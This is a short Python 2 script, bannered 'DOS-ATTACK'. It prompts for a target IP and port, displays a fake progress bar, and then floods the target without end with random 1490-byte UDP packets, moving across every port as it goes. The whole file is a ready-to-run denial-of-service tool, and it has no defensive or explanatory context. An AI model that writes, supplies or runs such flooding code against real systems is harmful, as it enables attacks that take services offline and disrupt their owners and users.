import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")

print ''' 
  _____   ____   _____           _______ _______       _____ _  __
 |  __ \ / __ \ / ____|       /\|__   __|__   __|/\   / ____| |/ /
 | |  | | |  | | (___ ______ /  \  | |     | |  /  \ | |    | ' / 
 | |  | | |  | |\___ \______/ /\ \ | |     | | / /\ \| |    |  <  
 | |__| | |__| |____) |    / ____ \| |     | |/ ____ \ |____| . \ 
 |_____/ \____/|_____/    /_/    \_\_|     |_/_/    \_\_____|_|\_\
                              
                                                              
                                                                  '''
ip = raw_input("IP ? ")
port = input("Port     ? ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
